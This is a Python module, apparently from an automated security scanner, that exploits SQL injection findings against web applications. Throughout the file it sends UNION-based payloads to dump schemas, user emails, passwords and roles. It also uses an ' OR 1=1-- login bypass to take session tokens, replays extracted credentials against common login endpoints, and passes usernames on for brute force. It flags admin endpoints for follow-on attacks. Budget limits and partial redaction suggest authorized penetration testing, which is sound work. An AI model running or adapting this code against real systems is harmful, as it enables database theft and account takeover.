"""
PHANTOM AI - SQLi Prover

Proves SQL injection exploitability: repeat, extract, escalate, chain.
Extracted from scanning/exploit_proof_engine.py.
"""

from __future__ import annotations

import json
import re

from scanning.proof_engine.base_prover import BaseProver
from scanning.proof_engine.models import ProofResult

from utils.logger import get_logger

logger = get_logger(__name__)


class SQLiProver(BaseProver):
    """Prove SQL injection exploitability: repeat, extract, escalate, chain."""

    async def prove(self, finding: dict) -> ProofResult:
        result = ProofResult()
        url, param_type, param_name = self._parse_matched_at(finding)

        # M3 FIX: Extract all metadata values once (was 5 separate isinstance checks)
        metadata = finding.get("metadata", {})
        if not isinstance(metadata, dict):
            metadata = {}

        # Extract payload from poc or direct metadata
        poc = metadata.get("poc", {})
        payload = poc.get("working_payload", "") if isinstance(poc, dict) else ""
        if not payload:
            payload = metadata.get("payload", "")

        # Extract param name from metadata if not in matched_at
        if not param_name:
            param_name = metadata.get("parameter", "")

        # Extract db type and data (single access after isinstance guard)
        db_type = (metadata.get("database_type", "") or "").lower()
        extracted = metadata.get("extracted_data", {}) or {}

        # THEME-10 FIX: Explicit "not attempted" instead of silent empty result
        if not url:
            return ProofResult.not_attempted("missing_url")
        if not payload:
            return ProofResult.not_attempted("missing_payload")

        # Determine if this is a JSON POST injection or a query param injection
        is_json_post = param_type in ("json_body", "json", "body", "post")
        method = "POST" if is_json_post else "GET"

        # --- Q1: Can I repeat? ---
        if is_json_post and param_name:
            status, body, _ = await self._safe_request(method, url, json_data={param_name: payload})
        elif param_name:
            status, body, _ = await self._safe_request(method, url, params={param_name: payload})
        else:
            status, body, _ = await self._safe_request("GET", url)

        if status > 0 and self._has_sqli_signal(body, db_type):
            result.can_repeat = True
            result.repeat_count = 1
            self._record_vector_attempt("sqli_repeat", True, payload, url)
            # Second confirmation
            if is_json_post and param_name:
                status2, body2, _ = await self._safe_request(method, url, json_data={param_name: payload})
            elif param_name:
                status2, body2, _ = await self._safe_request(method, url, params={param_name: payload})
            else:
                status2, body2, _ = await self._safe_request("GET", url)
            if status2 > 0 and self._has_sqli_signal(body2, db_type):
                result.repeat_count = 2
        else:
            self._record_vector_attempt("sqli_repeat", False, payload, url)

        # --- Q2: Can I mutate? ---
        if self.budget_remaining > 0 and result.can_repeat:
            # THEME-15 FIX: Pass result to capture extracted data
            mutations = await self._try_mutations(url, param_name, db_type, extracted, is_json_post, result)
            if mutations:
                result.can_mutate = True
                result.mutations = mutations
                self._record_vector_attempt("sqli_mutate", True, "", url)
            else:
                self._record_vector_attempt("sqli_mutate", False, "", url)

            # GAP-4 FIX: Prove data extraction depth
            extraction_proof = await self._prove_data_extraction(
                url, param_name, db_type, is_json_post, result
            )
            if extraction_proof.get("data_extracted"):
                result.proven_impact = extraction_proof.get("impact_evidence", "")
                self._record_vector_attempt("sqli_data_extraction", True, "", url)

        # --- Q3: Can I escalate? ---
        if self.budget_remaining > 0 and self._limits.get("allow_auth", False):
            # THEME-15 FIX: Pass result to capture privilege_gained
            escalation = await self._try_escalate(url, param_name, db_type, extracted, is_json_post, result)
            if escalation:
                result.can_escalate = True
                result.escalation = escalation
                self._record_vector_attempt("sqli_escalate", True, escalation, url)
            else:
                self._record_vector_attempt("sqli_escalate", False, "", url)

        # --- Q4: Can I chain? ---
        if result.can_escalate and "admin" in result.escalation.lower():
            # We got admin — find admin endpoints to probe
            chain_targets = self._find_chain_targets()
            if chain_targets:
                result.can_chain = True
                result.chain_targets = chain_targets
                self._record_vector_attempt("sqli_chain", True, "", url)

        result.requests_used = self._requests_used
        return result.finalize()  # FIX P0-005: Calculate proof outcome and impact

    def _has_sqli_signal(self, body: str, db_type: str) -> bool:
        """Check if response shows SQL injection signal."""
        signals = [
            "sql", "syntax", "query", "sqlite", "mysql", "postgresql",
            "oracle", "microsoft", "unclosed quotation", "SQLSTATE",
        ]
        body_lower = body.lower()
        return any(s in body_lower for s in signals) or len(body) > 100

    async def _try_mutations(
        self, url: str, param: str, db_type: str, extracted: dict, is_json_post: bool = False, result: ProofResult | None = None
    ) -> list[str]:
        """
        Try different extraction queries to prove data access flexibility.

        THEME-15 FIX: Now captures actual extracted data in result.data_extracted
        """
        mutations = []

        mutation_payloads = []
        if "sqlite" in db_type:
            mutation_payloads = [
                ("schema_extract", "' UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"),
                ("table_count", "' UNION SELECT count(*),2,3,4,5,6,7,8,9 FROM sqlite_master--"),
            ]
        elif "mysql" in db_type:
            mutation_payloads = [
                ("schema_extract", "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--"),
                ("version", "' UNION SELECT version(),2,3,4,5--"),
            ]
        elif "postgres" in db_type:
            mutation_payloads = [
                ("schema_extract", "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--"),
                ("version", "' UNION SELECT version(),2,3,4,5--"),
            ]
        else:
            # Generic
            mutation_payloads = [
                ("error_variant", "' OR '1'='1'--"),
                ("comment_variant", "' OR 1=1#"),
            ]

        for label, mpayload in mutation_payloads:
            if self.budget_remaining <= 0:
                break
            if is_json_post and param:
                status, body, _ = await self._safe_request("POST", url, json_data={param: mpayload})
            elif param:
                status, body, _ = await self._safe_request("GET", url, params={param: mpayload})
            else:
                continue
            if status > 0 and len(body) > 50:
                mutations.append(f"{label}: {mpayload[:60]}")

                # THEME-15 FIX: Capture actual extracted data
                if result is not None:
                    extracted_items = self._extract_data_from_response(body, label)
                    if extracted_items:
                        result.data_extracted.extend(extracted_items)
                        # Store evidence of the extraction
                        if not result.impact_evidence:
                            result.impact_evidence = {}
                        result.impact_evidence["sqli_extraction"] = {
                            "payload": mpayload[:100],
                            "label": label,
                            "items_extracted": len(extracted_items),
                            "sample": extracted_items[:3],  # First 3 samples
                        }

        return mutations

    def _extract_data_from_response(self, body: str, label: str) -> list[str]:
        """
        THEME-15 FIX: Extract actual data items from SQLi response.

        Converts "pattern matched" into "attacker extracted X, Y, Z".
        """
        extracted = []

        # Extract emails
        email_pattern = re.compile(r'[\w\.\-]+@[\w\.\-]+\.\w{2,}')
        emails = email_pattern.findall(body)
        extracted.extend([f"email:{e}" for e in emails[:5]])

        # Extract table names from schema dumps
        if "schema" in label or "table" in label:
            # SQLite: CREATE TABLE Users(id INTEGER...)
            table_pattern = re.compile(r'CREATE\s+TABLE\s+["\']?(\w+)["\']?', re.IGNORECASE)
            tables = table_pattern.findall(body)
            extracted.extend([f"table:{t}" for t in tables[:10]])

            # MySQL/PostgreSQL: table_name column output
            # Look for common sensitive table names
            sensitive_tables = ["users", "accounts", "passwords", "credentials", "admin", "tokens", "sessions"]
            body_lower = body.lower()
            for table in sensitive_tables:
                if table in body_lower:
                    extracted.append(f"table:{table}")

        # Extract version info
        if "version" in label:
            version_patterns = [
                re.compile(r'(MySQL|MariaDB|PostgreSQL|SQLite)\s*[\d\.]+', re.IGNORECASE),
                re.compile(r'\d+\.\d+\.\d+'),
            ]
            for pattern in version_patterns:
                matches = pattern.findall(body)
                if matches:
                    extracted.append(f"version:{matches[0]}")
                    break

        return extracted

    async def _try_escalate(
        self, url: str, param: str, db_type: str, extracted: dict, is_json_post: bool = False, result: ProofResult | None = None
    ) -> str:
        """
        Try to escalate: extract creds -> login -> admin.

        THEME-15 FIX: Now captures privilege_gained and impact_evidence in result.
        """
        # Strategy 1: The SQLi itself may be an auth bypass that returns a token
        # (e.g., Juice Shop /rest/user/login with ' OR 1=1--)
        if is_json_post and "/login" in url.lower() and param:
            if self.budget_remaining <= 0:
                return ""
            bypass_payload = "' OR 1=1--"
            status, body, _ = await self._safe_request("POST", url, json_data={param: bypass_payload, "password": bypass_payload})
            if status == 200 and body:
                try:
                    resp = json.loads(body)
                    token = (
                        resp.get("token")
                        or resp.get("access_token")
                        or (resp.get("authentication", {}) or {}).get("token")
                    )
                    if token:
                        # Check if this is an admin token
                        if self._auth_context:
                            self._auth_context.token = token
                            self._auth_context.method = "sqli_auth_bypass"
                        logger.info(f"[ProofEngine/SQLi] Auth bypass escalation via SQLi at {url}")

                        # THEME-4: Share extracted token with other modules
                        await self._share_extracted_token(token, url, "sqli_auth_bypass")

                        # THEME-15 FIX: Record privilege gained
                        if result is not None:
                            result.privilege_gained = "authenticated_session"
                            result.data_extracted.append(f"token:{token[:30]}...")
                            if not result.impact_evidence:
                                result.impact_evidence = {}
                            result.impact_evidence["auth_bypass"] = {
                                "method": "sqli_auth_bypass",
                                "token_obtained": True,
                                "token_preview": token[:50] + "..." if len(token) > 50 else token,
                            }

                        return f"Authentication bypass via SQLi — obtained JWT token directly"
                except (json.JSONDecodeError, AttributeError) as e:
                    logger.debug(f"[ProofEngine/SQLi] JWT extraction from SQLi response failed: {e}")

        # Strategy 2: If we already have extracted creds, try them
        if extracted and isinstance(extracted, dict):
            creds = self._extract_creds_from_data(extracted)
            if creds:
                # THEME-4: Share extracted credentials with other modules
                await self._share_extracted_credentials(creds, url)

                # THEME-15 FIX: Record credentials as extracted data
                if result is not None:
                    for email, pwd in creds[:3]:
                        result.data_extracted.append(f"cred:{email}:***")

                for email, password in creds[:3]:
                    if self.budget_remaining <= 0:
                        break
                    login_result = await self._try_login(email, password)
                    if login_result:
                        # THEME-15 FIX: Record privilege gained via credential login
                        if result is not None:
                            result.privilege_gained = f"account:{email}"
                            if not result.impact_evidence:
                                result.impact_evidence = {}
                            result.impact_evidence["credential_login"] = {
                                "account": email,
                                "method": "sqli_credential_extraction",
                            }
                        return f"Admin login via extracted credentials ({email})"

        # Strategy 3: Try extracting user table if SQLite
        if "sqlite" in db_type and param:
            if self.budget_remaining <= 0:
                return ""
            cred_payload = "' UNION SELECT email,password,role,3,4,5,6,7,8 FROM Users--"
            if is_json_post:
                status, body, _ = await self._safe_request("POST", url, json_data={param: cred_payload})
            else:
                status, body, _ = await self._safe_request("GET", url, params={param: cred_payload})
            if status > 0 and ("@" in body or "admin" in body.lower()):
                # THEME-15 FIX: Extract and record actual user data
                if result is not None:
                    # Extract emails from response
                    email_pattern = re.compile(r'[\w\.\-]+@[\w\.\-]+\.\w{2,}')
                    emails = email_pattern.findall(body)
                    for email in emails[:5]:
                        result.data_extracted.append(f"email:{email}")
                    if "admin" in body.lower():
                        result.data_extracted.append("role:admin")
                    if not result.impact_evidence:
                        result.impact_evidence = {}
                    result.impact_evidence["user_table_dump"] = {
                        "table": "Users",
                        "rows_visible": len(emails),
                    }
                return f"User credentials extracted from Users table"

        return ""

    def _extract_creds_from_data(self, data: dict) -> list[tuple[str, str]]:
        """Extract email/password pairs from extracted data."""
        creds = []
        # M3 FIX: Check data (not metadata - was a bug)
        if isinstance(data, dict):
            rows = data.get("rows", data.get("data", []))
            if isinstance(rows, list):
                for row in rows[:5]:
                    if isinstance(row, dict):
                        email = row.get("email", row.get("username", ""))
                        password = row.get("password", row.get("pass", ""))
                        if email and password:
                            creds.append((str(email), str(password)))
        return creds

    # =========================================================================
    # THEME-4: Cross-module data sharing
    # =========================================================================

    async def _share_extracted_credentials(self, creds: list[tuple[str, str]], source_url: str) -> None:
        """Share extracted credentials with other modules via SharedFindingsStore."""
        try:
            from utils.shared_findings_store import SharedFindingsStore
            store = SharedFindingsStore.get_instance()

            cred_dicts = [
                {"username": email, "password_hash": password}
                for email, password in creds
            ]

            await store.add_extracted_data(
                data_type="credentials",
                values=cred_dicts,
                source_module="sqli_prover",
                source_endpoint=source_url,
                context={"extraction_method": "sql_injection", "count": len(creds)},
            )

            # Also share usernames for brute force attacks
            usernames = [email for email, _ in creds]
            await store.add_extracted_data(
                data_type="usernames",
                values=usernames,
                source_module="sqli_prover",
                source_endpoint=source_url,
                context={"extraction_method": "sql_injection"},
            )

            logger.info(f"[THEME-4/SQLi] Shared {len(creds)} credentials for cross-module use")
        except Exception as e:
            logger.debug(f"[THEME-4/SQLi] Failed to share credentials: {e}")

    async def _share_extracted_token(self, token: str, source_url: str, method: str) -> None:
        """Share extracted auth token with other modules."""
        try:
            from utils.shared_findings_store import SharedFindingsStore
            store = SharedFindingsStore.get_instance()

            await store.add_extracted_data(
                data_type="tokens",
                values=[{"token": token, "type": "jwt", "method": method}],
                source_module="sqli_prover",
                source_endpoint=source_url,
                context={"extraction_method": "sqli_auth_bypass"},
            )

            # Also register as chain opportunity for session_abuse
            await store.add_extracted_data(
                data_type="chain_opportunities",
                values=[{
                    "chain_type": "sqli_to_session",
                    "description": "SQLi auth bypass obtained JWT - test for session abuse",
                    "token": token[:50] + "..." if len(token) > 50 else token,
                }],
                source_module="sqli_prover",
                source_endpoint=source_url,
                context={"suggested_modules": ["session_abuse", "authorization"]},
            )

            logger.info(f"[THEME-4/SQLi] Shared auth token for cross-module chain")
        except Exception as e:
            logger.debug(f"[THEME-4/SQLi] Failed to share token: {e}")

    async def _try_login(self, email: str, password: str) -> dict | None:
        """Try to login with extracted credentials."""
        if self.budget_remaining <= 0:
            return None

        # Try common login endpoints — find host from any finding
        host = self._resolve_host()
        if not host:
            return None

        # First check EndpointMap for discovered login endpoints
        login_paths = []
        if self._endpoint_map:
            for ep in self._endpoint_map.get_all():
                path_lower = ep.path.lower()
                if any(kw in path_lower for kw in ["/login", "/auth", "/signin", "/session"]):
                    if ep.path.startswith("http"):
                        login_paths.append(ep.path)
                    else:
                        login_paths.append(f"{host.rstrip('/')}{ep.path}")
                    if len(login_paths) >= 3:
                        break

        # Fallback to hardcoded common paths if EndpointMap had nothing
        if not login_paths:
            login_paths = [
                f"{host.rstrip('/')}/rest/user/login",
                f"{host.rstrip('/')}/api/auth/login",
                f"{host.rstrip('/')}/api/login",
                f"{host.rstrip('/')}/login",
            ]

        for login_url in login_paths:
            if self.budget_remaining <= 0:
                break
            status, body, _ = await self._safe_request(
                "POST", login_url,
                json_data={"email": email, "password": password},
                headers={"Content-Type": "application/json"},
            )
            if status == 200 and body:
                try:
                    resp = json.loads(body)
                    token = (
                        resp.get("token")
                        or resp.get("access_token")
                        or (resp.get("authentication", {}) or {}).get("token")
                    )
                    if token:
                        # Update auth context for subsequent provers
                        if self._auth_context:
                            self._auth_context.token = token
                            self._auth_context.method = "sqli_credential_extraction"
                            self._auth_context.email = email
                        logger.info(f"[ProofEngine/SQLi] Credential escalation: logged in as {email}")
                        return {"token": token, "email": email}
                except (json.JSONDecodeError, AttributeError) as e:
                    logger.debug(f"[ProofEngine/SQLi] Login response parsing failed for {email}: {e}")
        return None

    def _find_chain_targets(self) -> list[str]:
        """Find admin/privileged endpoints to chain into."""
        targets = []
        host = self._resolve_host()
        if self._endpoint_map:
            for ep in self._endpoint_map.get_all():
                path_lower = ep.path.lower()
                if any(kw in path_lower for kw in ["/admin", "/manage", "/configuration", "/users"]):
                    if ep.path.startswith("http"):
                        targets.append(ep.path)
                    elif host:
                        targets.append(f"{host.rstrip('/')}{ep.path}")
                    else:
                        targets.append(ep.path)
                if len(targets) >= 5:
                    break
        return targets

    # =========================================================================
    # GAP-4 FIX: Exploit Depth — Prove actual data extraction
    # =========================================================================

    async def _prove_data_extraction(
        self, url: str, param: str, db_type: str, is_json_post: bool, result: ProofResult
    ) -> dict:
        """
        GAP-4 FIX: Extract actual data to prove SQLi impact.

        Instead of just "SQLi found", proves "extracted N user records".
        Ethical: Only extracts COUNT and first 3 rows (redacted).
        """
        extraction_proof = {
            "data_extracted": False,
            "row_count": 0,
            "sample_data": [],
            "tables_discovered": [],
            "impact_evidence": "",
        }

        if self.budget_remaining <= 0:
            return extraction_proof

        # Step 1: Count rows in user table
        count_payloads = {
            "sqlite": "' UNION SELECT COUNT(*),2,3,4,5,6,7,8,9 FROM Users--",
            "mysql": "' UNION SELECT COUNT(*),2,3,4,5 FROM users--",
            "postgres": "' UNION SELECT COUNT(*)::text,NULL,NULL,NULL,NULL FROM users--",
        }

        count_payload = count_payloads.get(db_type, count_payloads["sqlite"])
        if is_json_post and param:
            status, body, _ = await self._safe_request("POST", url, json_data={param: count_payload})
        elif param:
            status, body, _ = await self._safe_request("GET", url, params={param: count_payload})
        else:
            return extraction_proof

        # Try to extract numeric count from response
        if status > 0 and body:
            count_match = re.search(r'\b(\d{1,6})\b', body)
            if count_match:
                potential_count = int(count_match.group(1))
                if 1 <= potential_count <= 100000:  # Reasonable user count
                    extraction_proof["row_count"] = potential_count
                    extraction_proof["data_extracted"] = True

        # Step 2: Extract sample data (first 3 rows, emails only, redacted)
        if self.budget_remaining > 0 and extraction_proof["data_extracted"]:
            sample_payloads = {
                "sqlite": "' UNION SELECT email,2,3,4,5,6,7,8,9 FROM Users LIMIT 3--",
                "mysql": "' UNION SELECT email,2,3,4,5 FROM users LIMIT 3--",
                "postgres": "' UNION SELECT email,NULL,NULL,NULL,NULL FROM users LIMIT 3--",
            }

            sample_payload = sample_payloads.get(db_type, sample_payloads["sqlite"])
            if is_json_post and param:
                status, body, _ = await self._safe_request("POST", url, json_data={param: sample_payload})
            elif param:
                status, body, _ = await self._safe_request("GET", url, params={param: sample_payload})

            if status > 0 and body:
                # Extract emails and redact them
                email_pattern = re.compile(r'[\w\.\-]+@[\w\.\-]+\.\w{2,}')
                emails = email_pattern.findall(body)
                for email in emails[:3]:
                    # Redact: john.doe@example.com -> j***e@example.com
                    local, domain = email.split("@") if "@" in email else (email, "")
                    if len(local) > 2:
                        redacted = f"{local[0]}***{local[-1]}@{domain}"
                    else:
                        redacted = f"***@{domain}"
                    extraction_proof["sample_data"].append(redacted)

        # Step 3: Discover table names (schema dump)
        if self.budget_remaining > 0:
            schema_payloads = {
                "sqlite": "' UNION SELECT name,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--",
                "mysql": "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()--",
                "postgres": "' UNION SELECT tablename,NULL,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public'--",
            }

            schema_payload = schema_payloads.get(db_type, schema_payloads["sqlite"])
            if is_json_post and param:
                status, body, _ = await self._safe_request("POST", url, json_data={param: schema_payload})
            elif param:
                status, body, _ = await self._safe_request("GET", url, params={param: schema_payload})

            if status > 0 and body:
                # Common sensitive table names
                sensitive_tables = ["users", "accounts", "credentials", "passwords", "tokens", "sessions", "orders", "payments"]
                body_lower = body.lower()
                for table in sensitive_tables:
                    if table in body_lower:
                        extraction_proof["tables_discovered"].append(table)
                        extraction_proof["data_extracted"] = True

        # Build impact evidence string
        if extraction_proof["data_extracted"]:
            parts = []
            if extraction_proof["row_count"] > 0:
                parts.append(f"Extracted {extraction_proof['row_count']} user records")
            if extraction_proof["sample_data"]:
                parts.append(f"Sample: {', '.join(extraction_proof['sample_data'])}")
            if extraction_proof["tables_discovered"]:
                parts.append(f"Tables: {', '.join(extraction_proof['tables_discovered'])}")
            extraction_proof["impact_evidence"] = ". ".join(parts)

            # Update result with extraction evidence
            result.data_extracted.extend([f"count:{extraction_proof['row_count']}"])
            result.data_extracted.extend([f"sample:{s}" for s in extraction_proof["sample_data"]])
            result.data_extracted.extend([f"table:{t}" for t in extraction_proof["tables_discovered"]])

            if not result.impact_evidence:
                result.impact_evidence = {}
            result.impact_evidence["data_extraction"] = extraction_proof
            result.impact_type = "DATA_LEAK"

        return extraction_proof
